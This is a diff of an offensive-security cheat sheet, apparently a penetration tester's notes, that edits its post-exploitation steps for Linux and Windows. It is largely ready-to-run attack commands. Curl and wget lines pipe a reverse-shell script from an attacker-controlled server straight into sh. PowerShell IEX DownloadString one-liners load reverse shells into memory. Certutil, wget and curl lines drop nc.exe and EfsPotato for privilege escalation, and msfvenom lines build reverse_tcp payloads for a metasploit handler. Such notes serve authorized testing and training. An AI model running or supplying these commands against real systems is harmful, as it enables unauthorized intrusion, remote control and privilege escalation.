@@ -845,17 +845,23 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 # Post-Exploitation 
 ## Start Fileserver
-python3 -m http.server 8888 -d ~/Upload
+python3 -m http.server 8888 -d /Upload
 
 ## Transfer Tools to a Proxy Box
 scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload
 
-
 ## Linux
+[*] Initial Shell
++---------- Generate resh ----------+
+python3 /Upload/resh.py $MYIP 5555 /Upload/resh
+
++---------- Execute resh ----------+
+curl http://$MYIP:8888/resh | sh
+wget -qO- http://$MYIP:8888/resh | sh
+
 [*] File Transfer
-wget -qO- http://$MYIP:8888/shells/resh | sh
-wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 curl http://$MYIP:8888/linux/linpeas.sh | sh
+wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
 +---------- Exploits ----------+
@@ -973,23 +979,19 @@ msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
 msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
 
 ## Windows
-[*] File Transfer
-+---------- My Files ----------+
-nc.exe
-resh.ps1
-EfsPotato.exe
-SigmaPotato.exe
-jp32.exe
+[*] Initial Shell
++---------- Execute resh ----------+
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
 
-+---------- To Disk ----------+
+[*] File Transfer
 wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
-wget http://$MYIP:8888/windows/bat2exe.bat -o \programdata\bat2exe.bat
+wget http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 wget http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
-curl http://$MYIP:8888/windows/bat2exe.bat -o \programdata\bat2exe.bat
+curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
 certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
-certutil -urlcache -f http://$MYIP:8888/windows/bat2exe.bat \programdata\bat2exe.bat
+certutil -urlcache -f http://$MYIP:8888/bat2exe.bat \programdata\bat2exe.bat
 certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPotato.exe
 
 [*] Privilege Escalation
@@ -1018,9 +1020,6 @@ bat2exe.bat > x.bat > x.exe > C:\programdata\x.exe
 C:\programdata\x.exe
 
 +---------- Shell From Memory ----------+
-rlwrap nc -lvnp 5555
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/resh.ps1');resh -Reverse $MYIP -Port 5555"
-
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
